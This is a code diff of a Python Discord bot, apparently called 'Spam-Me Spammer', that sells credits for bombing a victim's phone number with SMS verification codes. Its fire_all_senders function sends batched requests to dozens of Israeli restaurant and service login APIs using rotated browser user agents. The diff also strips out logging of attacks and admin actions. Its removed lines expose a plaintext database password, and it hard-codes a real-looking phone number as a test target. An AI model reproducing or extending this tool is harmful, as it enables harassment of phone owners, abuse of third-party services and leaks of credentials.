@@ -17,38 +17,33 @@ import certifi
 
 # ─── Config ───────────────────────────────────────────────────────────────────
 
-TOKEN     = ""
-MONGO_URI = "mongodb+srv://vbshs150_db_user:Natangoshen1423@cluster0.me3gpsz.mongodb.net/"
-DB_NAME   = "my_app_db"
+TOKEN = os.getenv("DISCORD_TOKEN")
+MONGO_URI = os.getenv("MONGO_URI")
+DB_NAME = "my_app_db"
 
-REQUIRED_GUILD_ID  = 1474108763135938563
-INVITE_LINK        = "https://discord.gg/MtD9NB9j45"
+REQUIRED_GUILD_ID = int(os.getenv("CLIENT_ID", "1474108763135938563"))
+INVITE_LINK = "https://discord.gg/MtD9NB9j45"
 
 CHANNELS = {
-    "PANEL":        1474209155848994836,
-    "LOG":          1474115180089839813,
-    "CREDIT_TABLE": 1475223147056988403,
-    "CMD_LOG":      1475477996860084355,
-    "GIFT_PANEL":   1480034209988083845,
-    "TRANSFER_LOG": 1481034587022032986,
+    "PANEL": 1481957038241353779,
+    "GIFT_PANEL": 1485104425625325709,
 }
-TEST_LOG = 1481427764333514782
 
-FREE_CREDITS_CHANNEL = 1480034209988083845
-BOMB_AUTO_CHANNEL    = 1474209155848994836
-INFO_CHANNEL         = 1478206395420643539
+FREE_CREDITS_CHANNEL = 1485104425625325709
+BOMB_AUTO_CHANNEL = 1481957038241353779
+INFO_CHANNEL = 1478206395420643539
 
-ALLOWED_ROLE_ID   = 1474109000889929864
-BUY_URL           = "https://vougepayment.xyz/"
+ALLOWED_ROLE_ID = 1474109000889929864
+BUY_URL = "https://vougepayment.xyz/"
 
-COOLDOWN_SECONDS  = 20
+COOLDOWN_SECONDS = 20
 ROUNDS_PER_CREDIT = 3
-MAX_CREDITS       = 100
-LAUNCH_COOLDOWN   = 5
-DAILY_TRANSFER    = 86400
+MAX_CREDITS = 100
+LAUNCH_COOLDOWN = 5
+DAILY_TRANSFER = 86400
 
-RED        = 0xDC143C
-DARK_RED   = 0x8B0000
+RED = 0xDC143C
+DARK_RED = 0x8B0000
 ORANGE_RED = 0xFF4500
 
 TOTAL_SERVICES = 88
@@ -60,14 +55,14 @@ intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 
-bot  = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
-mongo_client  = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
-db            = mongo_client[DB_NAME]
-credits_col   = db["users"]
+mongo_client = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
+db = mongo_client[DB_NAME]
+credits_col = db["users"]
 cooldowns_col = db["cooldowns"]
-settings_col  = db["settings"]
+settings_col = db["settings"]
 
 logging.basicConfig(level=logging.WARNING)
 
@@ -80,16 +75,14 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 26_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 GoogleWv/1.0 (WKWebView) GeminiiOS/1.2026.0570001",
-    "Mozilla/5.0 (Android 14; Mobile; rv:148.0) Gecko/148.0 Firefox/148.0",
-    ""
+    "Mozilla/5.0 (Android 14; Mobile; rv:148.0) Gecko/148.0 Firefox/148.0"
 ]
 
 def random_ua():
     return random.choice(USER_AGENTS)
-
 
 # ─── MongoDB Async helpers ────────────────────────────────────────────────────
 
@@ -138,98 +131,6 @@ async def set_cooldown(phone: str):
 
 def is_admin(interaction: discord.Interaction) -> bool:
     return ALLOWED_ROLE_ID in [r.id for r in interaction.user.roles]
-
-# ─── Log helpers ──────────────────────────────────────────────────────────────
-
-async def send_log(channel_id: int, embed: discord.Embed):
-    try:
-        ch = bot.get_channel(channel_id)
-        if ch: await ch.send(embed=embed)
-    except Exception as e:
-        logging.warning(f"Log send failed: {e}")
-
-async def log_cmd(user: discord.User, action: str, details: str = ""):
-    embed = discord.Embed(
-        title=f"📋 {action}",
-        description=f"**User:** {user.mention} (`{user.id}`)\n{details}",
-        color=DARK_RED, timestamp=datetime.now(timezone.utc)
-    )
-    await send_log(CHANNELS["CMD_LOG"], embed)
-
-async def log_attack(user: discord.User, phone: str, credits_used: int):
-    embed = discord.Embed(
-        title="🚀 Spam has Start",
-        description=(
-            f"**Spammer:** {user.mention}\n"
-            f"**Discord ID:** `{user.id}`\n"
-            f"**Target Number:** `{phone}`\n"
-            f"**Credits Used:** {credits_used}\n"
-            f"**Duration:** ~{credits_used * 35}s"
-        ),
-        color=RED, timestamp=datetime.now(timezone.utc)
-    )
-    embed.set_thumbnail(url=user.display_avatar.url)
-    embed.set_footer(text=f"{user.name} • Spam-Me Spammer")
-    await send_log(CHANNELS["LOG"], embed)
-
-async def log_free_credits(user: discord.User):
-    embed = discord.Embed(
-        title="🎁 Free Credits Claimed",
-        description=(
-            f"**User:** {user.mention}\n"
-            f"**Discord ID:** `{user.id}`\n"
-            f"**Amount:** +5 credits"
-        ),
-        color=RED, timestamp=datetime.now(timezone.utc)
-    )
-    embed.set_thumbnail(url=user.display_avatar.url)
-    embed.set_footer(text=f"{user.name} • Free Credits")
-    await send_log(TEST_LOG, embed)
-
-async def log_credit_action(admin: discord.User, target: discord.Member, action: str, amount: int = 0):
-    titles = {
-        "add":              "✅ Credits Added",
-        "remove":           "🗑️ Credits Removed",
-        "lifetime_grant":   "♾️ Lifetime Granted",
-        "lifetime_remove":  "♾️ Lifetime Removed",
-    }
-    bal_str = await get_balance_display(target.id)
-    embed = discord.Embed(
-        title=titles.get(action, "📋 Credit Action"),
-        description=(
-            f"**Admin:** {admin.mention} (`{admin.id}`)\n"
-            f"**Target:** {target.mention} (`{target.id}`)\n"
-            + (f"**Amount:** {amount} credits\n" if amount else "")
-            + f"**New Balance:** {bal_str}"
-        ),
-        color=RED, timestamp=datetime.now(timezone.utc)
-    )
-    embed.set_thumbnail(url=target.display_avatar.url)
-    embed.set_footer(text=f"By {admin.name} • Spam-Me Spammer")
-    await send_log(TEST_LOG, embed)
-
-async def update_credit_table():
-    try:
-        ch = bot.get_channel(CHANNELS["CREDIT_TABLE"])
-        if not ch: return
-        cursor = credits_col.find({"lifetime": {"$ne": True}}).sort("credits", -1).limit(10)
-        top = await cursor.to_list(length=10)
-        medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
-        rows = [f"{medals[i]}  <@{d.get('_id','?')}>  —  **{d.get('credits',0)}** credits"
-                for i, d in enumerate(top)]
-        embed = discord.Embed(
-            title="🏆 Credit Leaderboard — Top 10",
-            description="\n".join(rows) if rows else "No data yet.",
-            color=RED, timestamp=datetime.now(timezone.utc)
-        )
-        embed.set_footer(text="Updates after every transaction")
-        async for msg in ch.history(limit=5):
-            if msg.author == bot.user and msg.embeds:
-                await msg.edit(embed=embed)
-                return
-        await ch.send(embed=embed)
-    except Exception as e:
-        logging.warning(f"Credit table update failed: {e}")
 
 # ─── HTTP Engine ──────────────────────────────────────────────────────────────
 
@@ -285,7 +186,7 @@ async def _atmos(session, restaurant_id, phone, origin="https://order.atmos.rest
         "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site",
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=15) # העלנו ל-15 שניות למנוע Timeout
+        timeout = aiohttp.ClientTimeout(total=15)
         url = f"https://api-ns.atmos.co.il/rest/{restaurant_id}/auth/sendValidationCode"
         async with session.post(url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read() 
@@ -295,7 +196,6 @@ async def _atmos(session, restaurant_id, phone, origin="https://order.atmos.rest
         return False, label, str(type(e).__name__)
 
 async def process_atmos_in_batches(session, p, atmos_ids):
-    """פונקציה שמפצלת את הבקשות לאטמוס כדי שלא נקבל Timeout מרוב עומס על השרת שלהם"""
     results = []
     batch_size = 5
     for i in range(0, len(atmos_ids), batch_size):
@@ -303,10 +203,8 @@ async def process_atmos_in_batches(session, p, atmos_ids):
         tasks = [_atmos(session, rid, p) for rid in batch]
         res = await asyncio.gather(*tasks, return_exceptions=True)
         results.extend(res)
-        await asyncio.sleep(0.5) # מנוחה קטנה בין קבוצה לקבוצה
+        await asyncio.sleep(0.5)
     return results
-
-# --- פונקציות ייעודיות שמונעות שגיאות ---
 
 async def _claude(session, phone) -> tuple[bool, str, str]:
     label = "claude"
@@ -374,12 +272,12 @@ async def _oshioshi(session, phone) -> tuple[bool, str, str]:
 # ─── הלב של הספאמר ──────────────────────────────────────────────────────────
 
 async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
-    p          = phone
-    phone_972  = f"+972{p[1:]}" if p.startswith("0") else f"+972{p}"
-    uid        = str(_uuid.uuid4())
+    p = phone
+    phone_972 = f"+972{p[1:]}" if p.startswith("0") else f"+972{p}"
+    uid = str(_uuid.uuid4())
     rand_email = f"igal{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
     FORM = "application/x-www-form-urlencoded; charset=UTF-8"
-    CH   = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'
+    CH = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'
 
     def fh(origin, referer, extra=None):
         h = {"Content-Type": FORM, "x-requested-with": "XMLHttpRequest",
@@ -406,7 +304,6 @@ async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
             "2063","2070","2073","2076","2078","2087","2088","2091",
         ]
         
-        # הרצת כל שרתי אטמוס בקבוצות נפרדות כדי למנוע Timeout
         atmos_results = await process_atmos_in_batches(s, p, atmos_ids)
         
         atmos_club_tasks = [
@@ -498,7 +395,6 @@ async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
             _async_req(s,"POST","https://api.geteat.co.il/auth/sendValidationCode",data=geteat_fd,extra_headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36","accept-encoding":"gzip, deflate","origin":"https://order.geteat.co.il","referer":"https://order.geteat.co.il/","sec-fetch-mode":"cors","sec-fetch-site":"same-site"},label="geteat"),
         ] + atmos_club_tasks
 
-        # מריצים קודם את המשימות הרגילות
         results = await asyncio.gather(*tasks, return_exceptions=True)
         success, failed = 0, []
         for r in results:
@@ -514,7 +410,6 @@ async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
                     if ok: success += 1
                     else:  failed.append(lbl)
                     
-        # מוסיפים את התוצאות של אטמוס
         for r in atmos_results:
             if isinstance(r, Exception):
                 pass
@@ -563,10 +458,10 @@ class StopView(discord.ui.View):
 class ConfirmView(discord.ui.View):
     def __init__(self, phone: str, rounds: int, credits_cost: int, user_id: int):
         super().__init__(timeout=30)
-        self.phone        = phone
-        self.rounds       = rounds
+        self.phone = phone
+        self.rounds = rounds
         self.credits_cost = credits_cost
-        self.user_id      = user_id
+        self.user_id = user_id
 
     @discord.ui.button(label="✅ Yes, launch", style=discord.ButtonStyle.danger)
     async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -596,7 +491,6 @@ class ConfirmView(discord.ui.View):
         )
         embed.set_footer(text="Press Stop to abort.")
         await interaction.edit_original_response(embed=embed, view=StopView(self.user_id))
-        await log_attack(interaction.user, self.phone, self.credits_cost)
 
         try:
             for _ in range(self.rounds):
@@ -612,12 +506,11 @@ class ConfirmView(discord.ui.View):
                 title="🛑 Stopped" if stopped else "✅ Spam Complete",
                 color=DARK_RED
             )
-            final.add_field(name="📱 Target",       value=self.phone,                inline=True)
-            final.add_field(name="⏱️ Duration",     value=f"~{self.credits_cost * 35}s",  inline=True)
-            final.add_field(name="💰 Credits left", value=bal_str,                   inline=True)
+            final.add_field(name="📱 Target", value=self.phone, inline=True)
+            final.add_field(name="⏱️ Duration", value=f"~{self.credits_cost * 35}s", inline=True)
+            final.add_field(name="💰 Credits left", value=bal_str, inline=True)
             
             await interaction.edit_original_response(embed=final, view=None)
-            await update_credit_table()
 
         except Exception as e:
             active_attacks.pop(self.user_id, None)
@@ -664,10 +557,10 @@ class LaunchModal(discord.ui.Modal, title="🚀 Start Spam"):
             await interaction.response.send_message(f"❌ Must be 1–{MAX_CREDITS}.", ephemeral=True)
             return
 
-        uid          = interaction.user.id
+        uid = interaction.user.id
         total_rounds = credits_to_use * ROUNDS_PER_CREDIT
         
-        bal    = await get_credits(uid)
+        bal = await get_credits(uid)
         has_lt = await has_lifetime(uid)
 
         if bal < credits_to_use and not has_lt:
@@ -711,7 +604,7 @@ class ControlPanelView(discord.ui.View):
 
     @discord.ui.button(label="💣 Spam Phone", style=discord.ButtonStyle.danger, custom_id="cp_launch")
     async def launch_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        now  = time.time()
+        now = time.time()
         last = _launch_cooldowns.get(interaction.user.id, 0)
         if now - last < LAUNCH_COOLDOWN:
             rem = int(LAUNCH_COOLDOWN - (now - last))
@@ -777,8 +670,6 @@ class FreeCreditsView(discord.ui.View):
             color=RED
         )
         await interaction.followup.send(embed=embed, ephemeral=True)
-        await update_credit_table()
-        await log_free_credits(interaction.user)
 
 # ─── on_ready ─────────────────────────────────────────────────────────────────
 
@@ -810,7 +701,6 @@ async def on_ready():
             await free_ch.purge(limit=5)
             await free_ch.send(embed=embed, view=FreeCreditsView())
             
-        await update_credit_table()
     except Exception as e:
         print(f"Error in on_ready: {e}")
 
@@ -821,7 +711,7 @@ async def on_ready():
 async def slash_credits(interaction: discord.Interaction, member: discord.Member = None):
     target = member or interaction.user
     bal_str = await get_balance_display(target.id)
-    embed  = discord.Embed(
+    embed = discord.Embed(
         title="💰 Credits",
         description=f"{target.mention} — **{bal_str}** credits",
         color=RED
@@ -840,12 +730,10 @@ async def slash_addcredit(interaction: discord.Interaction, member: discord.Memb
     await add_credits(member.id, amount)
     new_bal_str = await get_balance_display(member.id)
     embed = discord.Embed(title="✅ Credits Added", color=RED)
-    embed.add_field(name="User",    value=member.mention, inline=True)
-    embed.add_field(name="Added",   value=str(amount),    inline=True)
-    embed.add_field(name="Balance", value=new_bal_str,    inline=True)
+    embed.add_field(name="User", value=member.mention, inline=True)
+    embed.add_field(name="Added", value=str(amount), inline=True)
+    embed.add_field(name="Balance", value=new_bal_str, inline=True)
     await interaction.response.send_message(embed=embed)
-    await update_credit_table()
-    await log_credit_action(interaction.user, member, "add", amount)
 
 @tree.command(name="removecredit", description="[ADMIN] Remove credits from a user")
 @app_commands.describe(member="Target user", amount="Amount to remove")
@@ -859,12 +747,10 @@ async def slash_removecredit(interaction: discord.Interaction, member: discord.M
     await remove_credits(member.id, amount)
     new_bal_str = await get_balance_display(member.id)
     embed = discord.Embed(title="🗑️ Credits Removed", color=DARK_RED)
-    embed.add_field(name="User",    value=member.mention, inline=True)
-    embed.add_field(name="Removed", value=str(amount),    inline=True)
-    embed.add_field(name="Balance", value=new_bal_str,    inline=True)
+    embed.add_field(name="User", value=member.mention, inline=True)
+    embed.add_field(name="Removed", value=str(amount), inline=True)
+    embed.add_field(name="Balance", value=new_bal_str, inline=True)
     await interaction.response.send_message(embed=embed)
-    await update_credit_table()
-    await log_credit_action(interaction.user, member, "remove", amount)
 
 @tree.command(name="lifetime", description="[ADMIN] Grant unlimited credits to a user")
 @app_commands.describe(member="Target user")
@@ -880,7 +766,6 @@ async def slash_add_lifetime(interaction: discord.Interaction, member: discord.M
         color=RED
     )
     await interaction.followup.send(embed=embed)
-    await log_credit_action(interaction.user, member, "lifetime_grant")
 
 @tree.command(name="removelifetime", description="[ADMIN] Remove lifetime from a user")
 @app_commands.describe(member="Target user")
@@ -896,7 +781,6 @@ async def slash_removelifetime(interaction: discord.Interaction, member: discord
         color=DARK_RED
     )
     await interaction.followup.send(embed=embed)
-    await log_credit_action(interaction.user, member, "lifetime_remove")
 
 @tree.command(name="freecredits", description="[ADMIN] Post the free credits gift message")
 async def slash_freecredits(interaction: discord.Interaction):
@@ -912,7 +796,6 @@ async def slash_freecredits(interaction: discord.Interaction):
         color=0x000000
     )
     await interaction.response.send_message(embed=embed, view=FreeCreditsView())
-    await log_cmd(interaction.user, "Free Credits Posted", "Admin posted free credits message")
 
 @tree.command(name="giveall", description="[ADMIN] Give credits to everyone")
 @app_commands.describe(amount="Amount to give to all users")
@@ -926,11 +809,6 @@ async def slash_giveall(interaction: discord.Interaction, amount: int):
         return
     await credits_col.update_many({}, {"$inc": {"credits": amount}})
     await interaction.followup.send(f"✅ Gave **{amount}** credits to everyone!", ephemeral=True)
-    embed = discord.Embed(title="📋 Give All Credits", color=DARK_RED, timestamp=datetime.now(timezone.utc))
-    embed.add_field(name="Admin:",   value=f"{interaction.user.name} (`{interaction.user.id}`)", inline=False)
-    embed.add_field(name="Command:", value="`/giveall`",                                         inline=False)
-    embed.add_field(name="Details:", value=f"Gave **{amount}** credits to everyone.",            inline=False)
-    await send_log(CHANNELS["CMD_LOG"], embed)
 
 @tree.command(name="checkcredit", description="[ADMIN] Check balance of a specific user")
 @app_commands.describe(member="User to check")
@@ -941,8 +819,8 @@ async def slash_checkcredit(interaction: discord.Interaction, member: discord.Me
     await interaction.response.defer(ephemeral=True)
     status = await get_balance_display(member.id)
     embed = discord.Embed(title="💳 Wallet Info (Admin View)", color=0x2b2d31)
-    embed.add_field(name="User:",            value=member.mention,    inline=True)
-    embed.add_field(name="Current Balance:", value=f"**{status}**",  inline=True)
+    embed.add_field(name="User:", value=member.mention, inline=True)
+    embed.add_field(name="Current Balance:", value=f"**{status}**", inline=True)
     embed.set_footer(text=f"Requested by {interaction.user.name}")
     await interaction.followup.send(embed=embed, ephemeral=True)
 
@@ -968,16 +846,10 @@ async def slash_transfercredit(interaction: discord.Interaction, member: discord
     await remove_credits(uid, amount)
     await add_credits(member.id, amount)
     embed = discord.Embed(title="💸 Transfer Complete", color=0x000000)
-    embed.add_field(name="From",   value=interaction.user.mention, inline=True)
-    embed.add_field(name="To",     value=member.mention,           inline=True)
-    embed.add_field(name="Amount", value=f"**{amount}** credits",  inline=True)
+    embed.add_field(name="From", value=interaction.user.mention, inline=True)
+    embed.add_field(name="To", value=member.mention, inline=True)
+    embed.add_field(name="Amount", value=f"**{amount}** credits", inline=True)
     await interaction.followup.send(embed=embed, ephemeral=True)
-    await update_credit_table()
-    log_embed = discord.Embed(title="💸 Credit Transfer Log", color=RED, timestamp=datetime.now(timezone.utc))
-    log_embed.add_field(name="Sender:",   value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=False)
-    log_embed.add_field(name="Receiver:", value=f"{member.mention} (`{member.id}`)",                    inline=False)
-    log_embed.add_field(name="Amount:",   value=f"**{amount}** Credits",                                inline=False)
-    await send_log(CHANNELS["TRANSFER_LOG"], log_embed)
 
 @tree.command(name="restart", description="[ADMIN] Restart the bot")
 async def slash_restart(interaction: discord.Interaction):
@@ -985,7 +857,6 @@ async def slash_restart(interaction: discord.Interaction):
         await interaction.response.send_message("❌ Admins only.", ephemeral=True)
         return
     await interaction.response.send_message("🔄 Restarting...", ephemeral=True)
-    await log_cmd(interaction.user, "Bot Restart", "Bot is restarting now")
     await bot.close()
     os.execv(sys.executable, [sys.executable] + sys.argv)
 
@@ -997,8 +868,7 @@ async def slash_checkstatus(interaction: discord.Interaction):
     
     await interaction.response.defer(ephemeral=True)
     
-    # שיניתי למספר אמיתי שלך לבדיקה כדי שהכל יעבוד אמיתי!
-    test_phone = "0506500708" 
+    test_phone = "0506500708"
     
     success, failed = await fire_all_senders(test_phone)
     total = success + len(failed)
@@ -1015,7 +885,6 @@ async def slash_checkstatus(interaction: discord.Interaction):
         embed.add_field(name="Failed APIs:", value=failed_str, inline=False)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
-
 
 if __name__ == "__main__":
     bot.run(TOKEN)
